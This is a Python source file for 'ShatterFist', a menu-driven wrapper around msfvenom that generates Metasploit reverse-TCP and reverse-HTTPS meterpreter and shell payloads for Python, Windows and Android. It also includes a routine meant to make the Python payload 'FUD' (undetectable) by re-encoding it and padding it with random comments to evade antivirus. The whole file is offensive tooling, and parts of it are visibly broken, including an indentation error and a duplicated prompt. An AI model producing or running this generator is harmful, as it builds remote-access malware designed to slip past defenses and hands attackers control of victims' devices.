#!/usr/bin/env python3
import colorama
import subprocess
import sys
import re 
import base64
import random
import string 
import time 
import sys 



banner= ('''@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
@@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
!@@       @@!  @@@  @@!  @@@    @@!      @@!    @@!       @@!  @@@  @@!       @@!  !@@         @@!    
!@!       !@!  @!@  !@!  @!@    !@!      !@!    !@!       !@!  @!@  !@!       !@!  !@!         !@!    
!!@@!!    @!@!@!@!  @!@!@!@!    @!!      @!!    @!!!:!    @!@!!@!   @!!!:!    !!@  !!@@!!      @!!    
 !!@!!!   !!!@!!!!  !!!@!!!!    !!!      !!!    !!!!!:    !!@!@!    !!!!!:    !!!   !!@!!!     !!!    
     !:!  !!:  !!!  !!:  !!!    !!:      !!:    !!:       !!: :!!   !!:       !!:       !:!    !!:    
    !:!   :!:  !:!  :!:  !:!    :!:      :!:    :!:       :!:  !:!  :!:       :!:      !:!     :!:    
:::: ::   ::   :::  ::   :::     ::       ::     :: ::::  ::   :::   ::        ::  :::: ::      ::    
:: : :     :   : :   :   : :     :        :     : :: ::    :   : :   :        :    :: : :       :     
                                                                                                      
                                                                                                      
@@@  @@@   @@@@@@                                                                                     
@@@  @@@  @@@@@@@@                                                                                    
@@!  @@@       @@@                                                                                    
!@!  @!@      @!@                                                                                     
@!@  !@!     !!@                                                                                      
!@!  !!!    !!:                                                                                       
:!:  !!:   !:!                                                                                        
 ::!!:!   :!:                                                                                         
  ::::    :: :::::                                                                                    
   :      :: : :::                                                                                    
                                  ''')

lhost = "localhost"
lport = "4962"
pyoutfile = "pythonpayload.py"
winoutfile = "windowspayload.exe"
androutfile = "androidpayload.apk"
defaultarch = "x86"
talkbackm1 = "tcp"

def clearscreen():
    if sys.platform == "linux":
        subprocess.run("clear")
    elif sys.platform == "win32":
        subprocess.run("cls")

#For printopt func
n = 1
def printopt(texxt):  
    global n
    print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + str(n) + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + texxt + colorama.Style.RESET_ALL)
    n += 1   

def printbannred(texxt):
    return print(colorama.Fore.LIGHTRED_EX +  "#=====+" + texxt + "+=====#" )

    
    

def inputcopt(texxt):
    print("\n")
    dvhdnhhg = input(colorama.Fore.YELLOW + str(texxt) + colorama.Fore.WHITE).strip()
    print(colorama.Style.RESET_ALL)  
    return dvhdnhhg
def inputc(texxt):
    print("\n")
    dvhdnhhg = input(colorama.Fore.LIGHTBLUE_EX + str(texxt) + colorama.Fore.GREEN).strip()
    print(colorama.Style.RESET_ALL)  
    return dvhdnhhg    

def lask():
    global lhost, lport
    lhostask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX + "(" + lhost + ")" + colorama.Fore.BLUE + " : ")
    lportask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX +  "(" + lport +  ")" + colorama.Fore.BLUE + " : ")
    if lhostask.strip() != '':
        lhost = str(lhostask)
    if lportask.strip() != '':
        lport = str(lportask)    
    print(colorama.Style.RESET_ALL)

def payloadgen1(payload, talkback, lhost, lport, outfile):
    subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    

def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
    subprocess.run(f"msfvenom {args1} -p {payloadandsession} LHOST={lhost} LPORT={lport} {args2} -o {outfile}", shell=True)    


def asktb():
    global n, talkbackm1 
    n = 1 
    printopt("Use reverse_tcp")
    printopt("Use reverse_https")
    talkbackopt = inputcopt("Option: ").strip()
    if  talkbackopt == "1" or talkbackopt == "tcp":
        talkbackm1 = "tcp"
    elif talkbackopt == "2" or talkbackopt == "https":
        talkbackm1 = "https"
    else:
        print (f"{colorama.Fore.GREEN}Defaulting to {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")

        


def pythonpayload():
    global n, pyoutfile, lhost, lport, talkbackm1 
    n = 1
    clearscreen()
    printbannred("Python Payload Menu")
    printopt("Create a simple python meterpreter payload")
    printopt("Create an obfistucated (FUD) python meterpreter payload")
    inputpy = inputc("Option: ").strip()
    lask()
    inputpy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({pyoutfile}){colorama.Fore.BLUE}: ")
    asktb()
    if inputpy2.strip() != "":
        pyoutfile = inputpy2
    #generate simple payload    
    if inputpy == "1":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
        payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile, '', '')
        print(colorama.Style.RESET_ALL)
        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
        time.sleep(2)
        menu()


    elif inputpy == "2": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
        pythonpayloadfud()

def pythonpayloadfud():
    print("Making payload FUD...")
    pytempf = open(pyoutfile + ".tmp", "r")
    dat1 = pytempf.readline()
    #part of file b4 base64 code
    b4b64 = "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('"
    #part of file after
    afb64 = "')[0]))"
    b64pycode = re.search("\('utf-8'\)\('(.+)'\)\[0\]\)", dat1).group(1)
    pytempf.close()
    pycode = base64.b64decode(b64pycode)
    #print(pycode)
    splpycode = pycode.decode().split("\n")
    #print(splpycode)
    pycodeembedlist = []
    for z in splpycode:
        pycodeembedlist.append(z)
        pycodeembedlist.append("\n")
        pycodeembedlist.append( '#' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)))
        pycodeembedlist.append("\n")
    finalcode = ''.join(pycodeembedlist)  
    finalcodeb64  = base64.b64encode(finalcode.encode("utf-8"))
    outpy = (b4b64 + str(finalcodeb64) + afb64)
    file = open(pyoutfile, "w")
    file.write(outpy)
    file.close
    print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
    time.sleep(2)
    menu()

def winpayload():                         
    global n, winoutfile, lhost, lport, talkbackm1
    n = 1
    clearscreen()
    printbannred("Windows Payload Menu")
    printopt("Create a simple windows meterpreter payload")
    printopt("Create a siple windows shell payload")
    inputwin = inputcopt("Option: ").strip()
    lask()
    inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({winoutfile}){colorama.Fore.BLUE}: ")
    asktb()
    if inputy2.strip() != "":
        winoutfile = inputy2
    if inputwin == "1": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2("windows/meterpreter/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
        print(colorama.Style.RESET_ALL)
        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {winoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
        time.sleep(2)
        menu()
    if inputwin == "2":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2("windows/shell/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
        print(colorama.Style.RESET_ALL)
        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {winoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
        time.sleep(2)    

    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputwin} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        winpayload()   

def androidpayload():
    global  n, androutfile, lhost, lport, talkbackm1
    n = 1
    clearscreen()
    printbannred("Android Payload Menu")
    printopt("Create a simple android payload")
    inputy = inputcopt("Option: ").strip()
    lask()
    asktb()
    if inputy == "1": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2(f"android/meterpreter/reverse_{talkbackm1}", lhost, lport, androutfile, '', '')
        print(colorama.Style.RESET_ALL)
        print(colorama.Fore.LIGHTGREEN_EX + f"Done! \nSaved as {androutfile} \n\n" + colorama.Style.RESET_ALL)
        time.sleep(2)
        menu()

    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        androidpayload()   


    

def menu():
    printopt("Create a python payload (MSF)")
    printopt("Create a windows payload (MSF)")
    printopt("Create an android payload (MSF)")
    #Option for Metasploit Console
    print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + "M" + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + "Start the Metasploit Framework Console" + colorama.Style.RESET_ALL)
     print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + "E" + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + "Exit ShatterFist" + colorama.Style.RESET_ALL)
    input1 = inputcopt("Option: ").strip().lower()
    input1 = inputcopt("Option: ").strip().lower()
    if input1 == "1":
        pythonpayload()
    elif input1 == "2":
        winpayload()
    elif input1 == "3":
        androidpayload() 
    elif input1 == "m":
        clearscreen()
        print(colorama.Fore.LIGHTRED_EX)
        subprocess.run("msfconsole")   
    elif input1  == "e":
        clearscreen()
        print(colorama.Fore.LIGHTRED_EX)
        bye = "Thanks for using ShatterFist!"
        for letter in bye:
            print(letter,end="", flush=True)
            time.sleep(0.1)
        sys.exit()

    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {input1} is not valid" + colorama.Style.RESET_ALL)
        time.sleep(2)
        menu()        
        
def main():
    print (colorama.Fore.LIGHTRED_EX + banner +  colorama.Style.RESET_ALL)
    menu()
clearscreen()
main()



    




                                                               